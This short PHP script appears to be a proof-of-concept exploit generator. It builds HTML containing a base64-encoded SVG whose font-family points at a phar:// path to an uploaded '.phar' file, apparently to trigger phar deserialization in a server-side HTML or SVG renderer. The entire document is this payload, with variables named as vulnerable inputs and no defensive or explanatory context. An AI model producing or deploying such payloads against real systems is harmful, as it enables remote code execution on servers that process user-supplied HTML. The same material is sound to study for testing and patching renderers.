<?php

$vuln_font_name = "phar:///uploads/v1/user/profile.phar/test";

$v1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>";
$v2 = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" ";
$v3 = "xmlns=\"http://www.w3.org/2000/svg\" ";
$v4 = "xmlns:xlink=\"http://www.w3.org/1999/xlink\" ";
$v5 = "width=\"200\" height=\"200\">";
$v6 = "<text x=\"20\" y=\"35\" style=\"color:red;font-family:${vuln_font_name};\">My</text></svg>";

$base64_value = base64_encode("$v1$v2$v3$v4$v5$v6");

$vuln_img = "<img src=\"data:image/png;base64,${base64_value}\"></img>";
$vuln_html = "<html>${vuln_img}</html>";

print_r("$vuln_html");
